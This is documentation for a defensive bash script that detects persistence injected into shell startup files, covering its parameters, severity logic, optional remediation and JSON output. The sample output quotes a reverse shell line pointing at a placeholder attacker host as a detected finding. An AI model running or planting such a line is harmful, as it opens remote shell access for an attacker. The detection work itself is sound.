## Detect-Persistence-Startup-Injection.sh

This script scans for malicious persistence mechanisms in startup files and shell configurations, providing a JSON-formatted output for integration with your SIEM.

### Overview

The `Detect-Persistence-Startup-Injection.sh` script identifies potential security risks in system and user startup files by analyzing their content for suspicious patterns such as reverse shells, encoded commands, and cryptocurrency miners.

### Script Details

#### Core Features

1. **Shell Configuration Scanning**: Examines system-wide and user-specific shell configuration files.
2. **Pattern Detection**: Identifies multiple categories of malicious content:
   - Pipe-to-shell downloads
   - Base64 encoded executions
   - Reverse shells
   - Cryptocurrency miners
   - Environment variable hijacking
   - Malicious prompt commands and traps
3. **Auto-Remediation**: Optional capability to safely comment out suspicious lines.
4. **JSON Output**: Generates a structured JSON report for integration with security tools.
5. **Logging Framework**: Provides detailed logs with automatic rotation.

### How the Script Works

#### Command Line Execution
```bash
./Detect-Persistence-Startup-Injection.sh [--fix]
```

#### Parameters

| Parameter | Type | Default Value | Description |
|-----------|------|---------------|-------------|
| `--fix` | flag | false | Enable auto-remediation for high/critical findings |
| `RECENT_DAYS` | int | 90 | Number of days to consider for recent modifications |
| `HASH_ALL` | bool | 0 | Calculate SHA256 for all files, not just suspicious ones |
| `SKIP_ETC_PROFILED` | bool | 0 | Skip scanning of /etc/profile.d directory |
| `VERBOSE` | bool | 0 | Enable verbose logging |

#### Example Invocation

```bash
# Basic scan
./Detect-Persistence-Startup-Injection.sh

# Scan with auto-remediation
./Detect-Persistence-Startup-Injection.sh --fix

# Scan with custom parameters
RECENT_DAYS=30 HASH_ALL=1 ./Detect-Persistence-Startup-Injection.sh
```

### Script Execution Flow

#### 1. Initialization Phase
- Sets up logging and configuration parameters
- Prepares temporary working directory
- Clears previous execution logs

#### 2. Target Collection
- Gathers system-wide startup files (`/etc/profile`, `/etc/bash.bashrc`)
- Collects user-specific shell configuration files
- Identifies valid shell users and their home directories

#### 3. File Analysis
- Examines each target file for suspicious patterns
- Calculates file scores based on findings
- Records file metadata (permissions, ownership, timestamps)

#### 4. Severity Assessment
- Determines overall severity based on findings:
  - `critical`: Reverse shells or recent modifications of high-severity items
  - `high`: Pipe downloads or encoded executions
  - `medium`: Miners, environment hijacking, or prompt traps
  - `low`: No significant findings

#### 5. Remediation (Optional)
- Creates backups of affected files
- Comments out suspicious lines
- Records remediation actions

### JSON Output Format

#### With Findings
```json
{
  "timestamp": "2025-07-18T10:30:45+00:00",
  "host": "hostname",
  "action": "Detect-Persistence-Startup-Injection.sh",
  "data": {
    "targets": [
      {
        "path": "/home/user/.bashrc",
        "exists": "true",
        "mtime": "2025-07-18T10:20:45Z",
        "size": "2048",
        "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "owner": "user",
        "perm": "644",
        "world_writable": "false",
        "suspicious": true,
        "score": 50,
        "hits": [
          {
            "line": 123,
            "category": "revshell",
            "text": "bash -i >& /dev/tcp/evil.com/4444 0>&1"
          }
        ],
        "recent_mod": true
      }
    ],
    "severity": "critical",
    "recent_days": "90",
    "hash_all": "0",
    "fix_applied": true,
    "remediations": [
      {
        "file": "/home/user/.bashrc",
        "backup": "/home/user/.bashrc.bak.20250718103045",
        "commented_lines": [123]
      }
    ]
  },
  "copilot_soar": true
}
```

### Implementation Guidelines

#### Best Practices
- Run with appropriate permissions to access all target files
- Regularly update pattern matching rules
- Test auto-remediation in a safe environment first
- Monitor log rotation and disk usage

#### Security Considerations
- Run with minimal required privileges
- Protect backup files from unauthorized access
- Validate all file paths before processing
- Handle temporary files securely

### Troubleshooting

#### Common Issues
1. **Permission Errors**: Check access rights for target files
2. **False Positives**: Review and update benign pattern list
3. **Remediation Failures**: Verify write permissions and disk space
4. **Performance Issues**: Monitor file count and processing time

#### Debugging
Enable verbose logging:
```bash
VERBOSE=1 ./Detect-Persistence-Startup-Injection.sh
```

### Contributing

When modifying this script:
1. Add new detection patterns carefully to minimize false positives
2. Update benign pattern list as needed
3. Test thoroughly with various shell configurations
4. Document pattern
